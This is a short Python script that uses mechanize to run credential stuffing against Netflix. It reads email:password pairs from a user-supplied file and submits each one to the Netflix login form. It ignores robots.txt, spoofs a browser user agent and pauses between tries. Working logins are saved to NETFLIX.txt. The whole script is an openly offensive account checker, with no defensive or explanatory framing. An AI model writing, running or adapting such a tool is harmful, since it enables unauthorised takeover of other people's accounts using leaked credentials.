import mechanize
import time
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Firefox')]
def netflix():
        print('NETFLIX')
        accPass = []
        NO=0
        for i in openn:
            currentline = i.split(':')
            email = currentline[0]
            password = currentline[1]
            email=email.strip(' ')
            password=password.strip('\n')
            password=password.strip(' ')
            br.open('https://www.netflix.com/in/login')
            br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
            br.select_form(nr=0)
            br.form['userLoginId'] = email
            br.form['password'] = password
            response = br.submit()
            if response.geturl() == 'https://www.netflix.com/browse':
                NO = NO + 1
                print("Found: " +email+":"+password+"")
                accPass.append(currentline[0] + ':' + currentline[1])
                br.open('https://www.netflix.com/signout?lnkctr=mL')
                print(NO)
            else:
                NO = NO + 1
                print(NO)
                print(email,password,'NOT FOUND')
            time.sleep(60)
                
        if len(accPass)>0:
            print("Writing active accounts to NETFLIX.txt..")
            for all in accPass:
               print(all)
               outfile = open('NETFLIX.txt', 'w')
               outfile.write(str(all) + '\n')
        else:
            print("None of em works")

def menu():
    list = input("Enter complete path of txt file: \n")
    global openn
    openn = open(list, "r")
    netflix()
menu()
